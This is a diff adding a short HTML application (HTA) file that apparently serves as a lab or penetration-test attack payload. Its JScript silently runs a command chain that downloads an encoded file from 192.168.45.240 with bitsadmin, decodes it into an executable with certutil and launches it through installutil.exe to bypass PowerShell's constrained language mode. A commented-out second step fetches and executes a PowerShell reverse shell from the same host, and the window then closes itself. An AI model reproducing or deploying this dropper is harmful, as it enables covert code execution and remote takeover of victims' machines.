@@ -1,0 +1,20 @@
+<html>
+<head>
+    <script language="JScript">
+        var shell = new ActiveXObject("WScript.Shell");
+
+        // Step 1: Download and execute clm.exe to bypass PowerShell language mode
+        var downloadCommand = "cmd.exe /c bitsadmin /Transfer myJob http://192.168.45.240/fin.txt C:\\Windows\\Tasks\\fin1.txt && certutil -decode C:\\Windows\\Tasks\\fin1.txt C:\\Windows\\Tasks\\clm4.exe && del C:\\Windows\\Tasks\\fin1.txt && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\clm4.exe";
+        shell.Run(downloadCommand, 0, true);
+
+        // Step 2: After bypass, get the reverse shell
+      //  var reverseShellCommand = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.240/shell.ps1')\"";
+        // shell.Run(reverseShellCommand, 0, true);
+    </script>
+</head>
+<body>
+    <script language="JScript">
+        self.close();
+    </script>
+</body>
+</html>
